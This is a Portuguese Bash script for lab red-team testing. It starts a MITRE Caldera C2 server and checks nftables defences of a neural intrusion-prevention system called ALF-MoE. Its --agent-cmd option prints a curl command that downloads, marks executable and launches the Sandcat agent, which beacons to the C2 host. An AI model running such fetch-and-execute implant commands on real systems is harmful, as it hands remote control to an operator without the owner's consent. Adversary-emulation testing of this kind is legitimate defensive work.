#!/usr/bin/env bash
# ==============================================================================
# teste_caldera.sh - Orquestrador de Testes MITRE Caldera vs ALF-MoE
# ==============================================================================
# Este script prepara e valida o ambiente para emulação de adversários
# utilizando o MITRE Caldera contra o NIPS/NIDS neural ALF-MoE.
#
# Uso:
#   ./scripts/teste_caldera.sh --status    # Verifica status dos serviços e interfaces
#   ./scripts/teste_caldera.sh --start-c2  # Inicia o servidor MITRE Caldera
#   ./scripts/teste_caldera.sh --agent-cmd # Exibe o comando para deploy do Sandcat
#   ./scripts/teste_caldera.sh --check-nft # Inspeciona a tabela nftables do ALF-MoE
# ==============================================================================

set -eo pipefail

CALDERA_DIR="/home/null/caldera"
ALF_DIR="/home/null/ALF-MoE"
CALDERA_HOST="${CALDERA_HOST:-192.168.3.16}"
CALDERA_PORT="${CALDERA_PORT:-8888}"
CALDERA_URL="http://${CALDERA_HOST}:${CALDERA_PORT}"

echo "======================================================================"
echo "          MITRE Caldera <-> ALF-MoE Adversarial Test Suite"
echo "======================================================================"

case "$1" in
  --status)
    echo "[*] Verificando interfaces de rede ativas:"
    ip -brief addr
    echo ""
    echo "[*] Verificando processo do servidor MITRE Caldera:"
    if pgrep -a -f "server.py" | grep -v pgrep; then
      echo "[+] Servidor Caldera está em EXECUÇÃO."
      curl -sI -m 2 "$CALDERA_URL/" | head -n 5 || echo "[-] Falha ao conectar em $CALDERA_URL"
    else
      echo "[-] Servidor Caldera NÃO está em execução."
    fi
    echo ""
    echo "[*] Verificando regras de Defesa Ativa (nftables alf_defense):"
    if sudo -n nft list table inet alf_defense 2>/dev/null; then
      echo "[+] Tabela alf_defense encontrada no kernel."
    else
      echo "[i] Tabela alf_defense não encontrada ou requer sudo interativo."
    fi
    ;;

  --start-c2)
    echo "[+] Iniciando MITRE Caldera com ambiente local (conf/local.yml)..."
    cd "$CALDERA_DIR"
    exec ./.calderavenv/bin/python server.py
    ;;

  --agent-cmd)
    echo "[+] Comando de deploy do agente Sandcat (Linux 64-bit):"
    echo ""
    echo "curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' ${CALDERA_URL}/file/download > sandcat && chmod +x sandcat && ./sandcat -server ${CALDERA_URL} -group red"
    echo ""
    echo "[*] Para executar em background com jitter personalizado:"
    echo "./sandcat -server ${CALDERA_URL} -group red -c2 HTTP -delay 5 &"
    ;;

  --check-nft)
    echo "[*] Inspecionando IPs atualmente bloqueados pelo ALF-MoE no nftables:"
    sudo nft list table inet alf_defense || echo "Tabela alf_defense não existe no momento."
    ;;

  *)
    echo "Uso: $0 {--status | --start-c2 | --agent-cmd | --check-nft}"
    echo ""
    echo "Exemplos:"
    echo "  $0 --status     : Valida portas, interfaces e processos"
    echo "  $0 --start-c2   : Inicia o Caldera C2 Server"
    echo "  $0 --agent-cmd  : Mostra o comando de inicialização do agente Sandcat"
    echo "  $0 --check-nft  : Monitora bloqueios ativos em tempo real"
    ;;
esac
